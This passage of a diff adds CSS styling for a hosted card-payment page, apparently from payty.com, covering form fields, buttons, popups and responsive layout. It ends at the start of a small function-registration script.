+    min-height: 50px;
+    min-width:90px;
+    cursor:pointer;
+}
+
+.imgElt img{
+    max-width:90px;
+    max-height:40px;
+}
+.txtElt{
+    display:block;
+    text-align:center;
+}
+#certificat_label,#certificate,#suscription_id{
+    word-break: break-all;
+}
+#validationButtonPaymentMean,
+#backToBoutiqueBlock button,
+#retryPaymentButton,
+.pdfLink,
+#validationButtonCard,
+#printButton {
+    border:0;
+    border-radius:3px;
+    min-width:230px;
+    text-align:center;
+    display:block;
+    margin:0 auto;
+    height:48px;
+    line-height:48px;
+}
+#validationButtonPaymentMean,
+#backToBoutiqueBlock button,
+#retryPaymentButton,
+.pdfLink,
+#printButton {
+    text-transform:uppercase;
+}
+#simulationButtonCard{
+    border:0;
+    border-radius:3px;
+    min-width:80px;
+    text-align:center;
+    display:block;
+    margin-left:0 auto;
+    margin-right:0 auto;
+    height:30px;
+    line-height:30px;
+    text-transform:uppercase;
+    font-size : 14px;
+    margin-top: 20px;
+}
+
+#askMultiPaymentMeanButton, #changePaymentMeanButton {
+    border: 0;
+    border-radius: 3px;
+    text-align: center;
+    display: block;
+    margin: 0 85px;
+    height: 48px;
+    line-height: 48px;
+    text-transform: uppercase;
+}
+
+#askMultiPaymentMeanButtons #askMultiPaymentMeanButtonWrapper {
+    display: inline-block;
+    width: 50%;
+}
+#askMultiPaymentMeanButtons button {
+    margin: auto;
+}
+
+#askMultiPaymentMeanButtonWrapper #askMultiPaymentMeanButton {
+    margin-right: 10%;
+}
+#askMultiPaymentMeanButtonWrapper #changePaymentMeanButton {
+    margin-left: 10%;
+}
+
+#redirectMessageBlock {
+    line-height:60px;
+    text-align: center;
+    vertical-align: middle;
+}
+
+#backToBoutiqueBlock,
+#getTicketBlock {
+    text-align: center;
+}
+
+#backToBoutiqueBlock button,
+#getTicketBlock button {
+    display: inline-block;
+}
+
+#backToBoutiqueBlock button{
+    padding-left:32px;
+    padding-right:32px;
+}
+
+#backToBoutiqueTicket button {
+    overflow: hidden;
+}
+
+#cardDataInputBlock #cardDataInputHeader{
+    display: table;
+    width: 100%
+}
+
+#paymentMeanSecureBlock{
+    display:table-cell;
+    text-align:center;
+    vertical-align: middle;
+}
+
+#trdTitleContainer{
+    font-size: 18px;
+}
+
+h2.titleContainer{
+    display: inline-block;
+    margin: 20px 0 30px 10px;
+    padding: 0;
+    line-height: 1.2;
+    text-align: left;
+    color: #293c7a;
+    font-weight: 500;
+    font-size: 24px;
+}
+
+#paymentResult .titleContainer {
+        text-align: center;
+    }
+
+#cardDataInputBlock .titleContainer {
+    padding-left: 14px;
+    display: table-cell;
+    vertical-align: middle;
+    width: 100%; 
+}
+ .message {
+    padding:12px 0;
+    text-align: center;
+ }
+ .message .symbole{
+    font-style:italic;
+    color:#000000;
+ }
+
+.paramLabel,
+.help_anchor{
+    vertical-align: middle;
+}
+
+.paramInput select::-ms-expand {
+    border-width: 0;
+}
+
+.paramInput select,
+.cardNumber, .formControl,
+.largeField,
+#cvvid,
+.brand-choice{
+    border-radius:3px;
+    background-color:#f1f1f1;
+    border:1px solid #c1c1c1;
+    height:34px;
+    line-height: 34px;
+    padding:0 5px;
+    font-size: 14px;
+}
+
+.multicvv{
+    border-radius:3px;
+    background-color:#f1f1f1;
+    border:1px solid #c1c1c1;
+    height:34px;
+    line-height: 34px;
+    padding:0 5px;
+    font-size: 14px;
+    margin-right: 20px;
+}
+
+.paramInput select +select{
+    margin-left:10px;
+}
+.cardNumber{
+    float: left;
+    width: 83.3333%;
+}
+
+.help_anchor{
+    position:relative
+}
+.help_button{
+    font-size:17px;
+    color:#424242;
+    border:1px solid #464646;
+    width:24px;height:24px;
+    border-radius:12px;
+    text-align:center;
+    margin:auto;display:block;
+    float:right;
+}
+.help_popup img{
+    max-width:80%;
+    height:auto;
+}
+.help_anchor .help_popup{
+    position:absolute;
+    display:none;
+    z-index:100;
+    max-width: 350px;
+    box-shadow:0 0 32px 0 rgba(0,0,0,0.2);
+    bottom:50px;
+    width: 290px;
+}
+.help_anchor .help_popup .info{
+    margin:1em 0;
+    color:#3e3e3e;
+    font-size:12px;
+    display:block;
+    padding:0;
+}
+/*.help_anchor:hover .help_popup,.help_anchor:focus .help_popup,.help_anchor.hover .help_popup{
+    display:block;
+    right:0;
+    margin-top:12px;
+    background:#fff;
+    padding: 18px 10px;
+}*/
+.help_anchor .help_popup:before{
+    content:"";
+    position:absolute;
+    bottom:-30px;
+    right:0;
+    width:0;
+    height:0;
+    border-style:solid;
+    border-width:30px 30px 30px 0;
+    border-color:transparent #fff transparent transparent;
+}
+
+
+#footer{
+    border-top:1px solid #424242;
+    padding:20px 5px;
+    margin-top:80px;
+    margin-bottom: 20px;
+}
+#footer img{
+    float:left;
+}
+#footer a + img{
+    margin-left:40px;
+}
+#footer {
+    opacity: 0.5;
+    border-color: #000000;
+}
+#footer .copyright {
+    color: #000000;
+}
+#footer .footerLogoBlack {
+    display: inline;
+}
+#footer .footerLogoWhite {
+    display: none;
+}
+.footerLogoBlack a,
+.footerLogoWhite a {
+      text-decoration: none;
+}
+.copyright{
+    text-align:right;
+}
+.terms{
+    padding-left:40px;
+    position:relative;
+    text-decoration: underline;
+}
+.terms:before{
+    content:"";
+    display:block;
+    border-left:1px solid #000000;
+    height:65px;
+    position:absolute;
+    top: -22px;
+    left: 20px;
+    width: 1px;
+}
+
+
+.mobilePhone,.largeField {
+    float: left;
+    width:83.33%;
+}
+
+.mobilePhone #mobilephonecountrycodeid {
+    width : 49.5%;
+    float:left;
+}
+
+.mobilePhone #mobilephoneid {
+    width : 37.5%;
+    float:right;
+}
+
+.vads-birth-date-input {
+    width: 26%;
+}
+
+#paymentResult,#forwardMsg {
+    text-align: center;
+}
+
+#paymentResult .message, #forwardMsg .message {
+    background-color: #FFFFFF;
+    display: inline-block;
+    padding: 30px;
+}
+
+.paymentBrandChoiceBlock {
+    display: flex;
+    align-content: flex-start;
+    width: 83.33%;
+}
+
+.paymentBrandChoiceBlock .cardNumber {
+    float: left;
+    display: inline-block;
+    margin: 0;
+    position: relative;
+    border-radius: 3px 0 0 3px;
+    overflow: hidden;
+    border: 1px solid #c1c1c1;
+    border-right: 0px;
+    height: 34px;
+    line-height: 34px;
+    padding: 0 5px;
+    font-size: 14px;
+    width: 75%;
+}
+
+.paymentBrandChoiceBlock .cardNumber {
+    width: 75%;
+    max-width: calc(100% - 65px);
+}
+
+.paymentBrandChoiceBlock #paymentBrandChoice ul {
+    position: absolute;
+    z-index: 99;
+    height: 32px;
+    margin: 0;
+    padding: 0;
+    list-style-type: none;
+}
+
+.paymentBrandChoiceBlock #paymentBrandChoice ul:hover li:first-child {
+    border-bottom-right-radius: 0;
+}
+
+.paymentBrandChoiceBlock li:last-child {
+    border-bottom-left-radius: 3px;
+    border-bottom-right-radius: 3px;
+}
+
+.paymentBrandChoiceBlock li {
+    background: #fff;
+    width: 100%;
+    display: block;
+    border: 1px solid #c1c1c1;
+    border-top: none;
+    text-align: center;
+    height: 34px;
+    overflow: hidden;
+}
+
+.paymentBrandChoiceBlock li img {
+    border: none;
+    max-width: 37px;
+    max-height: 32px;
+    display: block;
+    width: auto;
+    height: auto;
+}
+
+#visa-sensory-branding.show {
+    height: 150px;
+}
+
+
+.cvvBlock {
+    display: flex;
+    align-content: flex-start;
+}
+
+.cvvBlock #cvvid {
+    float: left;
+    display: inline-block;
+    margin: 0;
+    position: relative;
+    overflow: hidden;
+    border: 1px solid #c1c1c1;
+    height: 34px;
+    line-height: 34px;
+    font-size: 14px;
+    text-align: center;
+}
+
+.cvvBlock #cvvid {
+    max-width: calc(100% - 65px);
+}
+
+.cvvBlock img {
+    border: none;
+    max-width: 37px;
+    max-height: 32px;
+    display: block;
+    width: auto;
+    height: 15px; /*la taille souhaitée*/
+    vertical-align: middle;
+	display:inline-block;
+	margin-right:5px;
+}
+
+.cvvBlock .help_anchor {
+    width:12% !important;
+}
+
+.cvvBlock .visu img {
+    max-width: 80%;
+    max-height: 100%;
+    height: auto;
+}
+@font-face{
+	font-family : "password";
+	src: url('https://static.payty.com/static/commons-br/responsive/css/jpl/font/password.ttf') format('opentype');
+}
+
+/* ==========================================================================
+   Helper classes
+   ========================================================================== */
+
+/*
+ * Hide visually and from screen readers:
+ * http://juicystudio.com/article/screen-readers-display-none.php
+ */
+
+.hidden {
+    display: none !important;
+    visibility: hidden;
+}
+
+/*
+ * Hide only visually, but have it available for screen readers:
+ * http://snook.ca/archives/html_and_css/hiding-content-for-accessibility
+ */
+
+.visuallyhidden {
+    border: 0;
+    clip: rect(0 0 0 0);
+    height: 1px;
+    margin: -1px;
+    overflow: hidden;
+    padding: 0;
+    position: absolute;
+    width: 1px;
+}
+
+/*
+ * Extends the .visuallyhidden class to allow the element
+ * to be focusable when navigated to via the keyboard:
+ * https://www.drupal.org/node/897638
+ */
+
+.visuallyhidden.focusable:active,
+.visuallyhidden.focusable:focus {
+    clip: auto;
+    height: auto;
+    margin: 0;
+    overflow: visible;
+    position: static;
+    width: auto;
+}
+
+/*
+ * Hide visually and from screen readers, but maintain layout
+ */
+
+.invisible {
+    visibility: hidden;
+}
+
+/*
+ * Clearfix: contain floats
+ *
+ * For modern browsers
+ * 1. The space content is one way to avoid an Opera bug when the
+ *    `contenteditable` attribute is included anywhere else in the document.
+ *    Otherwise it causes space to appear at the top and bottom of elements
+ *    that receive the `clearfix` class.
+ * 2. The use of `table` rather than `block` is only necessary if using
+ *    `:before` to contain the top-margins of child elements.
+ */
+
+.clearfix:before,
+.clearfix:after {
+    content: " "; /* 1 */
+    display: table; /* 2 */
+}
+
+.clearfix:after {
+    clear: both;
+}
+
+.fullWidth {
+    width:100%;
+}
+
+/*
+ * Window popup
+ */
+
+.help_anchor .help_popup {
+    display: none;
+    z-index: 100;
+    max-width: 350px;
+    box-shadow: 0 0 32px 0 rgba(0, 0, 0, 0.2);
+    right: auto;
+    top: 50%;
+    bottom: auto;
+    left: 50%;
+    width: 300px;
+    max-width: 300px;
+    -ms-transform: translateX(-50%)translateY(-50%);
+    -webkit-transform: translateX(-50%)translateY(-50%);
+    transform: translateX(-50%)translateY(-50%);
+}
+.help_button {
+    cursor: pointer;
+}
+.help_anchor:focus {
+    outline: none;
+}
+.help_anchor:hover .help_popup,
+.window .help_anchor:focus .help_popup,
+.window .help_anchor.hover .help_popup {
+    display: none;
+}
+.help_anchor.open .help_popup {
+    display: block;
+    right: auto;
+    margin-top: 0;
+    background: #fff;
+    padding: 18px 10px;
+}
+.help_anchor .help_popup:before {
+    content: "\2715";
+    font-size: 25px;
+    line-height: 25px;
+    position: absolute;
+    bottom: auto;
+    right: 0;
+    top: 0;
+    margin: 2px;
+    cursor: pointer;
+    width: auto;
+    height: auto;
+    border: none;
+}
+.help_anchor .help_popup .close_button {
+    font-size: 25px;
+    line-height: 25px;
+    position: absolute;
+    bottom: auto;
+    right: 0;
+    top: 0;
+    margin: 2px;
+    cursor: pointer;
+}
+
+/*
+ * Cetelem cards
+ */
+#puces_cetelem {
+    text-align: center;
+}
+#cetelemValidationSummary {
+    background-color: inherit;
+}
+#cetelemValidationSummary .message {
+    padding: 0;
+    text-align: left;
+    font-weight: bold;
+}
+#cetelemValidationSummaryTable {
+    margin: auto;
+    border-spacing: 3px;
+    border-collapse: initial;
+}
+#cetelemValidationSummaryTable td {
+    padding-right: 10px;
+    vertical-align: top;
+}
+#cetelemValidationSummaryTable .cetelem_left_column {
+    width: 35%;
+}
+
+/* =========================
+        MOBILE STYLE
+   ========================= */
+/*  Mobile header  */
+#mobile-toggle {
+    display: none;
+    position: relative;
+    font-size: 18px;
+    text-align: center;
+    padding: .2em;
+    width: 100%;
+    clear: both;
+    color: #7f7f7f;
+    font-weight: bold;
+    border: none;
+    cursor: pointer;
+    margin: 0 0 10px;
+}
+#mobile-toggle .titleLogo {
+    position: absolute;
+    left: 0;
+    top: 0;
+    bottom: 0;
+    margin: auto;
+    padding: 0 0 0 10px;
+    min-width: 40px;
+    max-height: 85%;
+    max-width: 20%;
+}
+#mobile-toggle .amountLabel {
+    max-width: 60%;
+    display: inline-block;
+    margin: auto;
+    padding: 14px 0;
+}
+#mobile-toggle .amountLabel span {
+    display: inline-block;
+}
+#mobile-toggle .caret-down {
+    position: absolute;
+    right: 10px;
+    top: 0;
+    bottom: 0;
+    margin: auto;
+    display: table;
+    height: 100%;
+    vertical-align: middle;
+    font-size: 24px;
+}
+
+
+/* ==========================================================================
+   EXAMPLE Media Queries for Responsive Design.
+   These examples override the primary ('mobile first') styles.
+   Modify as content requires.
+   ========================================================================== */
+
+@media only screen and (min-width: 769px) {
+    #backToBoutiqueBlock.mobileBackButton {
+        display: none;
+    }
+}
+
+@media only screen and (min-width: 481px) {
+    #validationButtonWrapper {
+        text-align: left;
+        margin-left: 30%;
+    }
+
+    #paymentMeanSecureBlock {
+        width: 30%;
+    }
+    #paymentMeanSecureBlock img {
+        max-width: 100px;
+    }
+    #cardDataInputBlock .titleContainer {
+        padding-left: 0;
+    }
+}
+
+@media only screen and (max-width: 70em) {
+   #headerTitle{
+    /* background-color:blue; */
+   }
+
+   #certificat_label{
+    max-width:100px;
+   }
+  #creditCardPaymentForm .paramLabel{
+    margin-left:0;
+  }
+}
+@media only screen and (max-width: 64em) {
+
+   #cardDataInputBlock span.titleValue{
+        font-size:0.70em;
+    }
+
+    #cardDataInputBlock .titleContainer {
+        font-size:1.5em;
+    }
+
+    .subtitle{
+        font-size: 14px;
+        display: inline;
+        font-weight: 400;
+        padding: 0 0 0 1em;
+        line-height: 2;
+        position: absolute;
+        left: 116px;
+        bottom: 0;
+        text-align: left;
+        width: 150px;
+    }
+}
+
+@media only screen and (max-width: 54em) {
+
+
+  #cardDataInputBlock span.titleValue{
+        font-size:0.65em;
+    }
+
+    #cardDataInputBlock .titleContainer {
+        font-size:1.2em;
+    }
+}
+
+@media only screen and (max-width: 48em) {
+   #rightBlock, .rightForm {
+    width: 90%;
+    margin: 20px auto;
+    display: block;
+    padding: 20px 1em;
+    margin-top : 0 !important;
+   }
+
+   #showHideLang {
+    z-index: 99;
+   }
+
+   #backToBoutiqueBlock {
+    margin-bottom: 10px;
+   }
+
+   .transactionTitle {
+    font-size: 15px;
+    font-weight: bold;
+   }
+
+   #TopBlock{
+    width:90%;
+    margin: 0 5%;
+   }
+
+   #shopLogo{
+    padding-top:10px;
+    padding-bottom:30px;
+    overflow:hidden;
+    min-height: 70px;
+   }
+   .innerLogo,
+   .innerLogo + p{
+    display:table-cell;
+    margin: 20px 20px 20px 0;
+    vertical-align:middle;
+   }
+  .innerLogo + p{
+    padding-left:20px;
+  }
+
+   .terms:before {
+    content:none;
+    }
+
+    #cardDataInputBlock span.titleValue{
+        font-size:1em;
+    }
+
+    #cardDataInputBlock .titleContainer {
+        font-size:2em;
+    }
+
+    #shopLogo > p {
+        margin-top: inherit;
+        margin-bottom: inherit;
+    }
+
+    #backToBoutiqueBlock.mobileBackButton {
+        margin-top: 10px;
+        display: visible;
+    }
+}
+@media only screen and (max-width: 35em) {
+  body{
+    font-size:.9em;
+  }
+
+    .copyright{
+    clear: both;
+    padding-top: 30px;
+    text-align:center;
+    }
+    #footer img {
+    float: none;
+    }
+    #footer {
+    text-align:center;
+    }
+    #cardDataInputBlock span.titleValue{
+        font-size:0.8em;
+    }
+
+    #cardDataInputBlock .titleContainer {
+        font-size:1.5em;
+    }
+}
+
+@media only screen and (max-width: 30em) {
+
+   #sddPaymentForm .paramLabel {
+        float: left;
+        clear: left;
+        width: 100%;
+        text-align: left;
+        margin: 0;
+        padding: 0;
+        font-size: 16px;
+    }
+    #sddPaymentForm .paramInput {
+        max-width: 100%;
+        width: 100%;
+    }
+
+    .mandatory{
+        position: relative;
+        top: inherit;
+        margin: 0 0 0 4px;
+        right: inherit;
+    }
+
+    #paymentMeanSecureBlock {
+        padding: 8px;
+    }
+
+    .paramInput {
+        max-width: 100%;
+    }
+
+    .form_line .paramLabel {
+        float: left;
+        clear: left;
+        width: 100%;
+        text-align: left;
+        margin: 0;
+        padding: 0;
+        font-size: 16px;
+    }
+
+    .copyrightThreeDS {
+        margin-left: 0;
+        text-align: center;
+    }
+
+    #creditCardPaymentForm .copyrightThreeDS {
+        margin-left: 0;
+    }
+}
+
+@media only screen and (max-width: 28em) {
+
+   .backToBoutiqueButton{
+    max-width:150px;
+    Text-align:left;
+   }
+   #paymentMeanSecureBlock{
+    padding: 8px;
+   }
+    .help_anchor .help_popup{
+    width:300px;
+   	left: 110%;
+    }
+    
+    td.donneeLongIdent.multiPaymentCardTypeLabel {    
+        heigth: 0px;
+        max-width: 0px;
+        visibility: collapse;
+    }
+}
+
+
+@media only screen and (max-width: 17em) {
+
+   #headerTitle{
+        font-size:30px;
+   }
+
+   #validationButtonPaymentMean,
+   #backToBoutiqueBlock button,
+   #retryPaymentButton,
+   .pdfLink,
+   #validationButtonCard,
+   #printButton {
+        min-width:210px;
+   }
+
+   .backToBoutiqueButton{
+        max-width: 130px;
+   }
+   .selectLang{
+        max-width:60px;
+   }
+}
+
+
+@media print,
+       (-o-min-device-pixel-ratio: 5/4),
+       (-webkit-min-device-pixel-ratio: 1.25),
+       (min-resolution: 120dpi) {
+    /* Style adjustments for high resolution devices */
+}
+
+/* ==========================================================================
+   Print styles.
+   Inlined to avoid the additional HTTP request:
+   http://www.phpied.com/delay-loading-your-print-css/
+   ========================================================================== */
+
+@media print {
+    *,
+    *:before,
+    *:after {
+        background: transparent !important;
+        color: #000 !important; /* Black prints faster:
+                                   http://www.sanbeiji.com/archives/953 */
+        box-shadow: none !important;
+        text-shadow: none !important;
+    }
+
+    a,
+    a:visited {
+        text-decoration: underline;
+    }
+
+    a[href]:after {
+        content: " (" attr(href) ")";
+    }
+
+    abbr[title]:after {
+        content: " (" attr(title) ")";
+    }
+
+    /*
+     * Don't show links that are fragment identifiers,
+     * or use the `javascript:` pseudo protocol
+     */
+
+    a[href^="#"]:after,
+    a[href^="javascript:"]:after {
+        content: "";
+    }
+
+    pre,
+    blockquote {
+        border: 1px solid #999;
+        page-break-inside: avoid;
+    }
+
+    /*
+     * Printing Tables:
+     * http://css-discuss.incutio.com/wiki/Printing_Tables
+     */
+
+    thead {
+        display: table-header-group;
+    }
+
+    tr,
+    img {
+        page-break-inside: avoid;
+    }
+
+    img {
+        max-width: 100% !important;
+    }
+
+    p,
+    h2,
+    h3 {
+        orphans: 3;
+        widows: 3;
+    }
+
+    h2,
+    h3 {
+        page-break-after: avoid;
+    }
+}
+.help_button {
+    font-size: 17px;
+    color: #424242;
+    border: 1px solid #464646;
+    width: 24px;
+    height: 24px;
+    border-radius: 12px;
+    text-align: center;
+    margin: auto;
+    display: block;
+    float: right;
+    cursor: pointer;
+    line-height: 24px;
+}
+.help {
+    margin: 4px 0 0 0;
+    width: 12.5%;
+    min-width: 40px;
+}
+.brand_choice_popup_open {
+    display: block;
+    position: fixed;
+    background: #fff;
+    padding: 30px 10px;
+    width: 300px;
+    max-width: 300px;
+    z-index: 100;
+    box-shadow: 0 0 32px 0 rgba(0, 0, 0, 0.2);
+    color:#3e3e3e;
+    font-size:12px;
+}
+.brand_choice_popup_open:before {
+    content: "\2715";
+    font-size: 25px;
+    line-height: 25px;
+    position: absolute;
+    bottom: auto;
+    right: 0;
+    top: 0;
+    margin: 2px;
+    cursor: pointer;
+    width: auto;
+    height: auto;
+    border: none;
+}
+.brand_choice_popup_closed {
+    display: none;
+}
+#arrow-down {
+    position: absolute;
+    right: 0;
+    color: #757575;
+    font-size: 14px;
+    display: none;
+    cursor: default;
+}
+
+#paymentBrandChoice {
+    position: relative;
+    float: left;
+    display: inline-block;
+    margin: 0;
+    border-radius: 0 3px 3px 0;
+    border: 1px solid #c1c1c1;
+    height: 34px;
+    line-height: 34px;
+    padding: 0 5px;
+    font-size: 14px;
+    width: 25%;
+    min-width: 60px;
+    max-width: 60px;
+}
+
+#paymentBrandChoice.is-deployed {
+    background: #f1f1f1 none;
+}
+#paymentBrandChoice.not-deployed {
+    background: #f1f1f1 url(https://static.payty.com/static/commons-br/brand-choice-unknown-card.png) no-repeat 50% 50%;
+}
+#cardNumberWrapper {
+    display: inline-block;
+    width: 87.5%;
+}
+#paymentBrandChoiceList.open {
+    overflow: visible;
+}
+#paymentBrandChoiceList.close {
+    overflow: hidden;
+}
+
+#backToBoutiqueTicket {
+    display: none;
+}
+
+#paymentOptions {
+  margin-top:10px;
+  width:100%;
+  clear: both;
+}
+#paymentOptionCredit {
+  display:inline;
+  width:58%;
+  float:left;
+  text-align:center;
+  border-right-style:solid;
+  border-right-width:1px;
+  border-color:#D3D3D3;
+}
+#paymentOptionDebit {
+  width:41%;
+  float:right;
+  text-align:center;
+}
+.dcc-placeholder {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  max-width: 870px;
+  width: 100%;
+  min-height: 520px;
+  z-index: 999;
+  border: solid black 4px;
+  background: white;
+}
+
+@media only screen and (max-width: 768px) {
+    .paymentBrandChoiceBlock {
+        width: 100%;
+    }
+    .brand_choice_popup_open {
+        transform: translateX(-50%)translateY(-50%);
+    }
+
+    .backShopDown {
+        display: block;
+        margin-top: -10px;
+    }
+
+    #backToBoutiqueFormDown, .backToBoutiqueButton {
+        min-width: 300px;
+    }
+
+    #backToBoutiqueFormDown > button.backToBoutiqueButton {
+        text-align: right;
+    }
+
+    #backToBoutiqueFormDown > .backToBoutiqueButton:before {
+        content: '';
+    }
+    #paymentResult .titleContainer {
+        font-size: 22px;
+    }
+    
+    #rightBlock {
+        overflow: auto;
+    }
+    
+  #paymentOptionCredit{
+    display:block;
+    width:100%;
+    border-right-width:0px;
+    border-bottom-width:1px;
+  }
+
+  #paymentOptionDebit {
+    width:100%;
+    float:clear;
+    text-align:center;
+  }
+
+  .three-ds-logo:first-child {
+    margin-left: 0 !important;
+  }
+
+  .dcc-placeholder {
+    min-height: 470px;
+  }
+}
+
+.three-ds-logo {
+    width: 48px;
+    height: 48px;
+    margin-top: 10px;
+}
+
+/* web customization */
+		body{
+    font-family:sans-serif;
+}
+.normalFont, .backToBoutiqueButton, .selectLang, .message .symbole, #shopLogo p, #paymentResult .messageHeader{
+    font-family:sans-serif;
+}
+
+#shopLogo p{
+    display: none;
+}
+
+#shopLogo .logoBoutique{
+    display: none;
+}
+
+
+#TopBlock {
+    width:42.2%;
+    margin-right:4%;
+    margin-left:2%;
+    display: inline-block;
+}
+#rightBlock {
+    width: 50.2%;
+    display: inline-block;
+}
+@media only screen and (max-width: 48em) {
+    #TopBlock{
+        width:90%;
+        margin: 0 5%;
+    }
+}
+@media only screen and (max-width: 768px) {
+    #rightBlock {
+        width: 90%;
+        display: block;
+    }
+}
+
+@media only screen and (max-width: 48em) {
+    .simplified-display {
+        display: none;
+    }
+}
+@media only screen and (max-width: 48em) {
+}
+body{
+    background-image:none;
+}
+
+#container {
+    max-width: 1140px;
+}	
+
+#TopBlock{
+    margin-top: 0px;
+}
+
+#rightBlock{
+    margin-top: -72px;
+}
+
+#imageHeader{
+    margin-top: 0px;
+}
+
+#locales {
+    display: block;
+}
+
+#backToBoutiqueForm {
+    display: block;
+}
+.backShopDown {
+    display: none;
+}
+
+@media screen and (max-width: 800px) {
+    .backShopDown {
+        display: block;
+    }
+}
+
+
+
+#header, #headerTitle {
+    visibility: visible;
+}
+#imageHeader {
+    display: none;
+}
+
+
+@media screen and (max-width: 800px) {
+    #imageHeader {
+        display: none !important;
+    }
+    baseImageHeader {
+        display: block !important;
+    }
+}
+
+#footer {
+    opacity: 0.3;
+    border-color: #000000;
+}
+#footer .copyright {
+    color: #000000;
+}
+#footer .footerLogoBlack {
+    display: inline;
+}
+#footer .footerLogoWhite {
+    display: none;
+}
+.terms:before {
+    border-color: #000000;
+}
+
+body, .color1{
+    background-color:#f5f5f5;
+}
+.bckgdColor1, #transactionData, #header, .subtitle_table{
+    background-color:#ffffff;
+}
+.imgElt:hover, #cardDataInputBlock #paymentMeanSecureBlock, #multiPaymentMeanBlock{
+    border-color:#ffffff;
+}
+pleaseWaitDiv{
+    border-color:#ffffff;
+}
+#rightBlock, .color2, #paymentResult .message, #forwardMsg .message{
+    background-color:#ffffff;
+}
+.imgElt{
+    border-color:#ffffff;
+}
+#showHideLang{
+    background-color:#424242;
+}
+.bckgdColor2, #paymentMeans .title_table, .title_table, .amount, #donationInfoTotal, .infoTransactionTable tr:last-child{
+    background-color:#FFD919;
+}
+.borderCustomizedColor {
+    border-color:#FFD919;
+}
+#validationButtonCard, #validationButtonPaymentMean, #askMultiPaymentMeanButton, #backToBoutiqueBlock button, #changePaymentMeanButton, #retryPaymentButton, .pdfLink, #printButton {
+	background-color:#FFD919;
+}
+
+.normalFont, .backToBoutiqueButton, .backToBoutiqueButton:before, .selectLang, .message .symbole, #shopLogo p, .txtElt, #installments .color1, #paymentMeans .color1{
+    color:#2f2f2f;
+}
+.color5, .bckgdColor1, #transactionData, #headerTitle, .infoTransactionTable, #paymentMeans .subtitle_table{
+    color:#000000;
+}
+.title-1, #cardDataInputBlock .titleContainer, #paymentMeanChoiceBlock .titleContainer, #paymentResult .titleContainer, .choiceMessageLabel, .title-2, .transactionTitle, #paymentSummary .titleContainer,  span.titleValue, #paymentResult .messageHeader{
+    color:#000000;
+}
+#paymentResult .color1, #paymentMeans .color2, .paramLabel, .copyright, .mess_small, #installments .color2, .paymentMeanList, .paymentMeanList .txtElt, .InfosPayLeft, .InfosPayRight{
+    color:#7f7f7f;
+}
+.amount, #donationInfoTotal, .validationButton, #paymentMeans .title_table, .title_table, .infoTransactionTable tr:last-child {
+    color:#000000;
+}
+#validationButtonCard, #validationButtonPaymentMean, #askMultiPaymentMeanButton, #backToBoutiqueBlock>button, #changePaymentMeanButton, #retryPaymentButton, button.pdfLink, #printButton {
+	color:#000000;
+}
+
+
+/* web */
+.listLang {
+    background-color: #ffffff;
+    box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 1px 5px 0 rgba(0, 0, 0, 0.12), 0 3px 1px -2px rgba(0, 0, 0, 0.2);
+    margin: 8px auto 0;
+    padding: 0;
+    border-radius: 4px 0 4px 4px;
+}
+.listLang li {
+    padding: .8em;
+}
+.listLang li a {
+    color: #7f7f7f;
+    text-transform: uppercase;
+    font-size: 12px;
+    margin: 0 0 0 5px;
+}
+.listLang li a:hover {
+    color: #000;
+}
+.listLang li.active {
+    background: #f3f3f3;
+}
+.listLang li.active a {
+    color: #000;
+}
+
+#header {
+    background-image: url('https://static.payty.com/static/commons-br/d/4kDl9MsWNKtJLDh6jK2WaA--/header_web.png');
+    font-size: 0;
+}
+
+#headerTitle {
+    font-size: 0;
+}
+    
+#headerTitle .subtitle {
+    margin-left: 180px;
+}
+
+@media only screen and (max-width: 768px) {
+    #mobile-toggle {
+        display: block;
+    }
+    #showHideLang {
+        cursor: pointer;
+        color: #fafafa;
+        top: 10px;
+        right: 10px;
+        font-size: 16px;
+        font-weight: 300;
+        border-radius: 0;
+        height: 50px;
+        line-height: 50px;
+        padding: 0;
+    }
+	.listLang {
+		margin: 60px auto 0;
+		right: 10px;
+	}
+    #showHideLang:after {
+        color: #fafafa;
+        display: none;
+    }
+    .cardNumber,
+    #expiration_date,
+    #birth_date {
+        width: 100%;
+    }
+    #creditCardPaymentForm {
+        margin: auto;
+        display: block;
+    }
+    #TopBlock {
+        width: 100% !important;
+        margin: 0 !important;
+    }
+    #rightBlock {
+        width: 100% !important;
+        margin: 10px auto;
+        display: block;
+        padding: 10px 1em;
+        margin-top: 0 !important;
+    }
+    #header {
+        display: none;
+    }
+    #headerTitle {
+        font-size: 0;
+        margin: 0;
+        line-height: 54px;
+        height: 54px;
+    }
+    .subtitle {
+        bottom: 10px;
+        left: 120px;
+    }
+    #shopLogo {
+    	padding: 10px;
+    }
+    #shopLogo .logoBoutique {
+    	max-width: 70%;
+        max-height: 50px;
+        width: auto;
+        float: left;
+        margin: 0;
+    }
+    #shopLogo p {
+    	margin-top: 60px;
+    }
+    #paymentMeanSecureBlock img {
+        max-height: 48px;
+        width: auto;
+    }
+    .paramInput select,
+    .cardNumber,
+    .formControl,
+    .largeField,
+    #cvvid {
+        height: 34px;
+        line-height: 34px;
+    }
+    #backToBoutiqueForm {
+        display: none !important;
+    }
+    #transactionInfoBlock,
+    #transactionInfoBlock .amount,
+    #transactionSecurityInformation {
+        display: none;
+    }
+	#selectLang {
+		display: none !important;
+	}
+    #transactionInfoBlock.active,
+    #transactionSecurityInformation.active {
+        display: block;
+        margin-bottom: 10px;
+    }
+    #cardDataInputBlock .titleContainer,
+    #paymentMeanSecureBlock {
+        display: none;
+    }
+    #footer {
+        margin-top: 40px;
+    }
+    #wholeform {
+    	overflow: auto;
+    }
+
+	.backShopDownErrorPage {
+		display: none !important;
+	}
+}
+
+#footer a + img {
+  margin-left: 40px;
+}
+
+@media only screen and (max-width: 64em){
+    .subtitle {
+        visibility: hidden;
+    }
+}
+
+@media only screen and (max-width: 30em) {
+    #creditCardPaymentForm {
+        max-width: 320px;
+        margin: auto;
+    }
+    .form_line .paramLabel {
+        font-weight: bold;
+    }
+    #cvvid {
+        width: 80px;
+    }
+    .paramInput {
+        margin-bottom: .5em;
+    }
+}
+
+@media only screen and (max-width: 417px) {
+  #footer a + img {
+    margin-right: 40px;
+  }
+}
+
+@media only screen and (max-width: 48em) {
+	.simplified-display {
+		display: none;
+	}
+}
+		
+/* shop customization */		
+		
+	</style>
+
+	
+
+	
+	
+
+	
+
+	<script type="text/javascript">
+		var functionList=new Array();
+	
+		function callRegisteredFunction() {
+			for (i = 0; i < functionList.length; ++i) {
+				functionList[i]();
+			}
+		}
+		
+		function registerFunction(func) {
+			functionList.push(func);
+		}
+		
+		function hasCookiesDisabled() {
